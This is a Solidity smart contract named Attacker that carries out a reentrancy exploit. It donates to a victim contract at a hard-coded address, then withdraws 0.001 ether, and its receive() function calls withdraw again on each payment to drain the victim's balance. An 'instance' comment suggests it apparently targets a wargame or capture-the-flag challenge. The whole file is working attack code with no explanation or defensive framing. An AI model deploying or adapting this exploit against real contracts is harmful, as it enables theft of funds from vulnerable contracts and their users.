//SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Attacker {

address public victimAddr = 0x8462a0a70ff4dC244EDFBEF16C8e27F17220165b; //put your instance addrr


function donate() payable external {
        (bool success, ) = address(victimAddr).call{value: msg.value}(abi.encodeWithSelector(bytes4(keccak256("donate(address)")), address(this)));
        require(success, "success donate");
}

function startWithdraw() public {
        uint amount = 0.001 ether;
        (bool success, ) = address(victimAddr).call(abi.encodeWithSelector(bytes4(keccak256("withdraw(uint256)")), amount));
        require(success, "success withdraw");
}

receive() external payable {
       startWithdraw();
}

}